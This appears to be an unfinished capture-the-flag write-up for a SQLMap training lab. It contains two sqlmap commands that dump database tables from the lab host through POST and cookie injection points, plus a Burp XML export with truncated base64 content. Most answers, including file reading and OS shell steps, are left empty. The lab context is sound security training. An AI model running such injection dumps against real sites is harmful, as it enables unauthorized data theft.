# [HTB] SQLMap Essentials


## Running SQLMap on an HTTP Request

>**Q. What's the contents of table flag2? (Case #2)**
```bash
sqlmap 'http://94.237.62.6:47094/case2.php' --data 'id=1' --batch --dump
```
>**Q. What's the contents of table flag3? (Case #3)**
```bash
sqlmap -u "http://94.237.62.6:47094/case3.php" --cookie='id=1*' --batch --dump
```
>**Q. What's the contents of table flag4? (Case #4)**
```xml
<?xml version="1.0"?>
<!DOCTYPE items [
<!ELEMENT items (item*)>
<!ATTLIST items burpVersion CDATA "">
<!ATTLIST items exportTime CDATA "">
<!ELEMENT item (time, url, host, port, protocol, method, path, extension, reque>
<!ELEMENT time (#PCDATA)>
<!ELEMENT url (#PCDATA)>
<!ELEMENT host (#PCDATA)>
<!ATTLIST host ip CDATA "">
<!ELEMENT port (#PCDATA)>
<!ELEMENT protocol (#PCDATA)>
<!ELEMENT method (#PCDATA)>
<!ELEMENT path (#PCDATA)>
<!ELEMENT extension (#PCDATA)>
<!ELEMENT request (#PCDATA)>
<!ATTLIST request base64 (true|false) "false">
<!ELEMENT status (#PCDATA)>
<!ELEMENT responselength (#PCDATA)>
<!ELEMENT mimetype (#PCDATA)>
<!ELEMENT response (#PCDATA)>
<!ATTLIST response base64 (true|false) "false">
<!ELEMENT comment (#PCDATA)>
]>
<items burpVersion="2023.1.2" exportTime="Fri Jul 14 10:53:44 CEST 2023">
  <item>
    <time>Fri Jul 14 10:52:04 CEST 2023</time>
    <url><![CDATA[http://94.237.62.6:47094/case4.php]]></url>
    <host ip="94.237.62.6">94.237.62.6</host>
    <port>47094</port>
    <protocol>http</protocol>
    <method><![CDATA[POST]]></method>
    <path><![CDATA[/case4.php]]></path>
    <extension>php</extension>
    <request base64="true"><![CDATA[UE9TVCAvY2FzZTQucGhwIEhUVFAvMS4xDQpIb3N0OiA>
    <status>200</status>
    <responselength>455</responselength>
    <mimetype>HTML</mimetype>
    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBGcmksIDE0IE>
    <comment></comment>
  </item>
</items>
```

```bash

```

## Attack Tuning

>**Q. What's the contents of table flag5? (Case #5)**

```bash

```

>**Q. What's the contents of table flag6? (Case #6)**

```bash

```

>**Q. What's the contents of table flag7? (Case #7)**

```bash

```

## Database Enumeration

>**Q. What's the contents of table flag1 in the testdb database? (Case #1)**



## Advanced Database Enumeration

>**Q. What's the name of the column containing "style" in it's name? (Case #1)**

```bash

```

>**Q. What's the Kimberly user's password? (Case #1)**

```bash

```

## Bypassing Web Application Protections

>**Q. What's the contents of table flag8? (Case #8)**

```bash

```
 
>**Q. What's the contents of table flag9? (Case #9)**

```bash

```

>**Q. What's the contents of table flag10? (Case #10)**

```bash

```

>**Q. What's the contents of table flag11? (Case #11)**

```bash

```

## OS Exploitation

>**Q. Try to use SQLMap to read the file "/var/www/html/flag.txt".**

```bash

```

>**Q. Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.**

```bash

```

## Skills Assessment

>**Q. What's the contents of table final_flag?**

```bash

```
